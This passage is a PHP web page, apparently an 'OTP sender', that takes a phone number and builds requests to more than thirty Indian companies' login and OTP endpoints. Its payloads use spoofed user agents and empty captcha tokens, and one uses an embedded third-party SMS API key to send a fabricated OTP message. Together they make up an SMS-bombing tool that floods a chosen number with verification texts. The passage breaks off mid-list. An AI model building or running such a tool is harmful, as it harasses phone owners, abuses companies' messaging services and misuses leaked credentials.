<!DOCTYPE html>
<html>
<head>
    <title>API Executor</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        .api-result { 
            border: 1px solid #ddd; 
            padding: 10px; 
            margin: 10px 0; 
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        .success { color: green; }
        .error { color: red; }
        .api-name { font-weight: bold; color: #0066cc; }
    </style>
</head>
<body>
    <h1>API Executor - OTP Sender</h1>
    <form method="get" action="">
        <label for="mobile">Enter Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required placeholder="9876543210" pattern="[0-9]{10}">
        <button type="submit">Submit</button>
    </form>

    <?php
    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        
        // Common headers
        $common_headers = [
            "Content-Type: application/json; charset=utf-8",
            "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001) AppleWebKit/537.36"
        ];
        
        $apis = [
            // 1. Zype
            [
                "name" => "01. Zype OTP",
                "url" => "https://stage-api-gateway.getzype.com/auth/signinup/code",
                "headers" => [
                    "Content-Type: application/json; charset=utf-8",
                    "User-Agent: okhttp/3.9.1"
                ],
                "data" => json_encode(["hashKey" => "", "phoneNumber" => "+91" . $mobile])
            ],
            
            // 2. RummyCircle
            [
                "name" => "02. RummyCircle OTP",
                "url" => "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.rummycircle.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "mobile" => $mobile,
                    "deviceId" => "d6be3862-7659-46c0-98b9-3d13328a243c",
                    "deviceName" => "",
                    "refCode" => "",
                    "isPlaycircle" => "false"
                ])
            ],
            
            // 3. Flipkart
            [
                "name" => "03. Flipkart OTP",
                "url" => "https://www.flipkart.com/api/5/user/otp/generate",
                "headers" => [
                    "X-user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    "Origin: https://www.flipkart.com",
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.flipkart.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => "loginId=%2B91" . $mobile
            ],
            
            // 4. ConfirmTkt
            [
                "name" => "04. ConfirmTkt OTP",
                "url" => "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber=" . $mobile,
                "headers" => [
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: securedapi.confirmtkt.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 5. HomeCentre
            [
                "name" => "05. HomeCentre OTP",
                "url" => "https://www.homecentre.in/in/en/mobilelogin/sendOTP",
                "headers" => [
                    "Host: www.homecentre.in",
                    "sec-ch-ua-platform: \"Android\"",
                    "x-requested-with: XMLHttpRequest",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "accept: */*",
                    "origin: https://www.homecentre.in",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.homecentre.in/in/en",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9"
                ],
                "data" => json_encode(["signInMobile" => "+91" . $mobile])
            ],
            
            // 6. Unacademy
            [
                "name" => "06. Unacademy OTP",
                "url" => "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: unacademy.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "phone" => $mobile,
                    "country_code" => "IN",
                    "otp_type" => 1,
                    "email" => "",
                    "send_otp" => true,
                    "is_un_teach_user" => false
                ])
            ],
            
            // 7. Rapido
            [
                "name" => "07. Rapido OTP",
                "url" => "https://customer.rapido.bike/api/otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: customer.rapido.bike",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode(["mobile" => $mobile])
            ],
            
            // 8. Entri
            [
                "name" => "08. Entri OTP",
                "url" => "https://entri.app/api/v3/users/check-phone/",
                "headers" => [
                    "Host: entri.app",
                    "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
                    "sec-ch-ua-mobile: ?1",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "Client: web",
                    "User-Language: hi",
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "sec-ch-ua-platform: \"Android\"",
                    "Origin: https://webapp.entri.app",
                    "Sec-Fetch-Site: same-site",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://webapp.entri.app/",
                    "Accept-Encoding: gzip, deflate, br",
                    "Accept-Language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => json_encode(["phone" => "+91" . $mobile])
            ],
            
            // 9. Adda52
            [
                "name" => "09. Adda52 OTP",
                "url" => "https://www.adda52.org.in/api/v1/offers/user/sendOtp",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.adda52.org.in",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => "user=" . $mobile . "&clientName=web&domainKey=Adda52.org.in&source=landing_page"
            ],
            
            // 10. Licious
            [
                "name" => "10. Licious OTP",
                "url" => "https://www.licious.in/api/login/signup",
                "headers" => [
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "accept: application/json, text/plain, */*",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "origin: https://www.licious.in",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.licious.in/profile",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Host: www.licious.in",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode(["phone" => $mobile, "captcha_token" => null])
            ],
            
            // 11. DesiFarms
            [
                "name" => "11. DesiFarms OTP",
                "url" => "https://newnode.desifarmsindia.in/desi_farm/web_api/sendOTPWeb",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: newnode.desifarmsindia.in",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode(["Customer_Mobile_Number" => $mobile])
            ],
            
            // 12. Chumbak
            [
                "name" => "12. Chumbak OTP",
                "url" => "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
                "headers" => [
                    "Host: omqkhavcch.execute-api.ap-south-1.amazonaws.com",
                    "shop_name: chumbakdesign.myshopify.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "action: sendOTP",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "accept: */*",
                    "origin: https://www.chumbak.com",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: cross-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.chumbak.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "username" => "+91" . $mobile,
                    "type" => "mobile",
                    "domain" => "www.chumbak.com",
                    "recaptcha_token" => ""
                ])
            ],
            
            // 13. TextLocal
            [
                "name" => "13. TextLocal OTP",
                "url" => "https://api.textlocal.in/send/?apikey=Nzg2NTM5Nzk1NDQ4Mzg0ODQ3NDE0ZTRiNjM0MTZiNTI%3D&sender=WHYTEF&numbers=91" . $mobile . "&message=Your%20One%20Time%20Password%20(OTP)%20is%204009.%20Please%20enter%20this%20to%20complete%20the%20verification.%20In%20case%20of%20further%20assistance%20call%20us%20at%209873710709%20%2F%2018001236455.",
                "headers" => [
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: api.textlocal.in",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 14. Provilac
            [
                "name" => "14. Provilac OTP",
                "url" => "https://mumbai.provilac.com/restapi/customer/sendOTP/v2",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: mumbai.provilac.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => "mobileNumber=" . $mobile . "&cityName=Mumbai&resendOtp=false"
            ],
            
            // 15. MediBuddy
            [
                "name" => "15. MediBuddy OTP",
                "url" => "https://loginprod.medibuddy.in/unified-login/user/register",
                "headers" => [
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "accept: application/json, text/plain, */*",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "origin: https://www.medibuddy.in",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.medibuddy.in/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Host: loginprod.medibuddy.in",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "source" => "medibuddyInWeb",
                    "platform" => "medibuddy",
                    "phonenumber" => $mobile,
                    "flow" => "Retail-Login-Home-Flow",
                    "idealLoginFlow" => false,
                    "advertiserId" => "bf4ac8e2-a8c8-L063-a8e1-0cd53184a979",
                    "mbUserId" => null
                ])
            ],
            
            // 16. NetMeds
            [
                "name" => "16. NetMeds OTP",
                "url" => "https://m.netmeds.com/mst/rest/v1/id/details/" . $mobile,
                "headers" => [
                    "User-Agent: Mozilla/5.0 ( Manual; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "Accept: application/json",
                    "Host: m.netmeds.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 17. IBO
            [
                "name" => "17. IBO OTP",
                "url" => "https://api.ibo.com/s/authn/api/v1/otp-generate",
                "headers" => [
                    "Host: api.ibo.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "x-channel-id: WEB",
                    "sec-ch-ua-mobile: ?1",
                    "x-user-journey-id: dad9eca3-84d0-43dd-af32-c3ca750253cc",
                    "accept: */*",
                    "origin: https://www.ibo.com",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.ibo.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "phone_number" => [
                        "number" => $mobile,
                        "country_code" => "+91"
                    ]
                ])
            ],
            
            // 18. BillClap
            [
                "name" => "18. BillClap OTP",
                "url" => "https://api.billclap.com/api/web/user/login",
                "headers" => [
                    "Host: api.billclap.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "authorization: Bearer undefined",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "accept: application/json",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "origin: https://app.billclap.com",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://app.billclap.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "mobile" => $mobile,
                    "source" => "web",
                    "rm_code" => null
                ])
            ],
            
            // 19. HippoHomes
            [
                "name" => "19. HippoHomes OTP",
                "url" => "https://portal.hippohomes.com/store/trigger_otp",
                "headers" => [
                    "Host: portal.hippohomes.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "accept: application/json, text/plain, */*",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "origin: https://www.hippohomes.com",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.hippohomes.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "mobile" => $mobile,
                    "reverseSmsClientOrder" => false
                ])
            ],
            
            // 20. Breeze
            [
                "name" => "20. Breeze OTP",
                "url" => "https://api.breeze.in/session/login",
                "headers" => [
                    "Host: api.breeze.in",
                    "x-request-id: 6oxootSqPQiGPIT-j9OKW",
                    "sec-ch-ua-platform: \"Android\"",
                    "x-device-id: UKNqvksYhCF_Gm56YTbLW",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "sec-ch-ua-mobile: ?1",
                    "x-app-id: ",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "x-shop-url: https://milton-india-store.myshopify.com",
                    "content-type: application/json",
                    "x-session-id: p4FBq89J5Ld25Prq9rxYw",
                    "accept: */*",
                    "origin: https://app.breeze.in",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://app.breeze.in/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "phoneNumber" => $mobile,
                    "email" => "",
                    "authVerificationType" => "otp",
                    "device" => [
                        "id" => "UKNqvksYhCF_Gm56YTbLW",
                        "details" => ["screenSize" => "0 X 0", "storageAccess" => true],
                        "platformVersion" => "129.0.6668.100",
                        "platform" => "Chrome",
                        "type" => "Mobile",
                        "osDetails" => "Android 10",
                        "deviceSubType" => "Android"
                    ],
                    "countryCode" => "+91",
                    "source" => null,
                    "hashCode" => "@www.milton.in",
                    "merchantParams" => null,
                    "feOffersApplied" => null,
                    "disableOTP" => false
                ])
            ],
            
            // 21. SugarCosmetics
            [
                "name" => "21. SugarCosmetics OTP",
                "url" => "https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp",
                "headers" => [
                    "sec-ch-ua-platform: \"Android\"",
                    "os_type: 2",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "sec-ch-ua-mobile: ?1",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "accept: application/json, text/plain, */*",
                    "content-type: application/json",
                    "version: 1.0",
                    "origin: https://in.sugarcosmetics.com",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://in.sugarcosmetics.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Host: prod.api.sugarcosmetics.com",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "phone_no" => "+91" . $mobile,
                    "website" => true,
                    "is_guest_checkout" => false
                ])
            ],
            
            // 22. Vedantu
            [
                "name" => "22. Vedantu OTP",
                "url" => "https://user.vedantu.com/user/preLoginVerification",
                "headers" => [
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "accept: */*",
                    "origin: https://www.vedantu.com",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.vedantu.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Host: user.vedantu.com",
                    "Connection: Keep-Alive",
                    "priority: u=1, i"
                ],
                "data" => json_encode([
                    "email" => null,
                    "phoneCode" => "+91",
                    "whatsappCommunicationEnabled" => false,
                    "phoneNumber" => $mobile,
                    "version" => 2,
                    "token" => "5nXaR2BzqApBb3Wf",
                    "sType" => "VEDANTU_F_7_N",
                    "sValue" => "FC34EE3ED23389CD8622BA1851D3E",
                    "ver" => "1729067214"
                ])
            ],
            
            // 23. Orient
            [
                "name" => "23. Orient OTP",
                "url" => "https://orient.marmeto.com/api/register/capture",
                "headers" => [
                    "Host: orient.marmeto.com",
                    "Connection: keep-alive",
                    "sec-ch-ua-platform: \"Android\"",
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "Accept: */*",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "Content-Type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "Origin: https://orientelectric.com",
                    "X-Requested-With: mark.via.gq",
                    "Sec-Fetch-Site: cross-site",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://orientelectric.com/",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Accept-Language: en-US,en;q=0.9"
                ],
                "data" => json_encode([
                    "email" => "jackkdkzks@gmail.com",
                    "firstName" => "Jack",
                    "phoneNumber" => $mobile,
                    "id" => "6995637567658"
                ])
            ],
            
            // 24. Havells
            [
                "name" => "24. Havells OTP",
                "url" => "https://havells.com/otplogin/account/otploginpost/",
                "headers" => [
                    "x-newrelic-id: Vw4EUlNTDBABVFlWDwgFUVAF",
                    "sec-ch-ua-platform: \"Android\"",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM4MzM1MDQiLCJhcCI6IjExMjAyODE4MTkiLCJpZCI6ImY4ZWFiNjFjNzlhMDQwYTMiLCJ0ciI6IjExNTRmZWUxMzM2ZWQ4ZTIyMmUzZjg2YzY5MDFkYzFiIiwidGkiOjE3Mjk0MDQ4ODM5MDMsInRrIjoiMTMyMjg0MCJ9fQ==",
                    "sec-ch-ua-mobile: ?1",
                    "traceparent: 00-1154fee1336ed8e222e3f86c6901dc1b-f8eab61c79a040a3-01",
                    "x-requested-with: XMLHttpRequest",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "accept: application/json, text/javascript, */*; q=0.01",
                    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                    "tracestate: 1322840@nr=0-1-3833504-1120281819-f8eab61c79a040a3----1729404883903",
                    "origin: https://havells.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://havells.com/customer/account/login/referer/aHR0cHM6Ly9oYXZlbGxzLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw%2C%2C/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Host: havells.com",
                    "Connection: Keep-Alive"
                ],
                "data" => "form_key=D3hwtUvNsUK3lTOG&mobile_number=" . $mobile . "&is_whatsapp_promo=on"
            ],
            
            // 25. StreetStyleStore
            [
                "name" => "25. StreetStyleStore OTP",
                "url" => "https://gateway.streetstylestore.com/gateway/v1/",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: gateway.streetstylestore.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "gateway_action" => "customer/checkCustomerMobile",
                    "mobile" => $mobile,
                    "site" => "sss"
                ])
            ],
            
            // 26. Kessa
            [
                "name" => "26. Kessa OTP",
                "url" => "https://www.kessa.com/wp-admin/admin-ajax.php",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "Accept: */*",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.kessa.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => "action=validate_send_phone_email_otp_kessa_custom&un=%2B91" . $mobile . "&pc=%2B91&pn=" . $mobile . "&cc=IN&ei=rahulsingh78@gmail.com&ft=login_user_with_otp&up=0&at=2&resend=0&nonce=aee1771656"
            ],
            
            // 27. UrbanClap
            [
                "name" => "27. UrbanClap OTP",
                "url" => "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: */*",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.urbanclap.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "country_id" => "IND",
                    "phone" => [
                        "isd_code" => "+91",
                        "phone_wo_isd" => $mobile
                    ],
                    "device_type" => "customer"
                ])
            ],
            
            // 28. WhpJewellers
            [
                "name" => "28. WhpJewellers OTP",
                "url" => "https://www.whpjewellers.com/Checkout.aspx/SendOTP",
                "headers" => [
                    "Content-Type: application/json; charset=UTF-8",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.whpjewellers.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "countryCode" => "+91",
                    "Mobile" => $mobile,
                    "SendOn" => "SMS"
                ])
            ],
            
            // 29. KukuFM
            [
                "name" => "29. KukuFM OTP",
                "url" => "https://kukufm.com/api/v1/users/auth/send-otp/",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: kukufm.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "phone_number" => "+91" . $mobile
                ])
            ],
            
            // 30. LapinozPizza
            [
                "name" => "30. LapinozPizza OTP",
                "url" => "https://lapinozpizza.in/client/login/" . $mobile . "/5",
                "headers" => [
                    "Host: lapinozpizza.in",
                    "sec-ch-ua-platform: \"Android\"",
                    "x-requested-with: XMLHttpRequest",
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "Accept: application/json, text/javascript, */*; q=0.01",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "sec-ch-ua-mobile: ?1",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "Referer: https://lapinozpizza.in/",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Accept-Language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 31. Hotstar
            [
                "name" => "31. Hotstar OTP",
                "url" => "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration",
                "headers" => [
                    "Host: www.hotstar.com",
                    "Sec-Ch-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
                    "X-Hs-Request-Id: 26ed76-8d35c5-5c845a-420041",
                    "Accept-Language: eng",
                    "X-Hs-Platform: mweb",
                    "X-Request-Id: 26ed76-8d35c5-5c845a-420041",
                    "Sec-Ch-UA-Platform: Android",
                    "X-Hs-Client-Targeting: ad_id:26ec46-766489-87eb9-cda86;user_lat:false",
                    "X-Hs-Accept-Language: eng",
                    "Sec-Ch-UA-Mobile: ?1",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "X-Hs-Client: platform:mweb;app_version:24.01.05.2;browser:Chrome;schema_version:0.0.1106;network_data:3g",
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "X-Hs-Device-Id: 26ec46-766489-87eb9-cda86",
                    "X-Country-Code: in",
                    "Origin: https://www.hotstar.com",
                    "Sec-Fetch-Site: same-origin",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://www.hotstar.com/in/onboarding?ref=%2Fin",
                    "Accept-Encoding: gzip, deflate, br",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "body" => [
                        "@type" => "type.googleapis.com/feature.login.InitiatePhoneLoginRequest",
                        "phone_number" => $mobile,
                        "initiate_by" => 0,
                        "recaptcha_token" => ""
                    ]
                ])
            ],
            
            // 32. A23Games
            [
                "name" => "32. A23Games OTP",
                "url" => "https://pfapi.a23games.in/a23user/signup_by_mobile_otp",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Encoding: gzip, deflate, br",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "Host: pfapi.a23games.in",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "channel" => "web",
                    "device_id" => "a0a47f87-7206-4952-91af-e3c347906b3c",
                    "model" => "Google,Android SDK built for x86,10",
                    "version" => "1.0.5",
